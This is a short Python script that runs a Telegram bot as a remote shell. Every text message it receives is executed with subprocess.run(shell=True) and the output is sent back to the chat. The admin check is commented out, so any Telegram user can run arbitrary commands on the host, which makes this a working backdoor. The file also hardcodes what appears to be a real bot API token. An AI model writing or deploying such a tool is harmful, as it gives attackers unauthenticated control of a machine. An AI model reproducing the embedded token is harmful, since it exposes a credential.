import telebot

import subprocess

# enter your bot id and your admin id
BOT_ID = "7833601847:AAESUbBaM9R2qYFg2ev0vhUWZiSojmprugI"
# ADMIN_ID = ""

bot = telebot.TeleBot(BOT_ID)


def ex_com(command: str) -> str:
    try:
        result = subprocess.run(command, shell=True, text=True, capture_output=True)
        return result.stdout
    except Exception as e:
        return str(e)


@bot.message_handler(commands=['start'])
def wellcome(message):
    bot.send_message(message.chat.id, "Write your command, naugty")


@bot.message_handler(content_types=['text'])
def command_execute(message):
    return_message = ex_com(message.text)
    if not return_message:
        return_message = "EMPTY"
    bot.send_message(message.chat.id, return_message)


if __name__ == "__main__":
    bot.polling(none_stop=True)
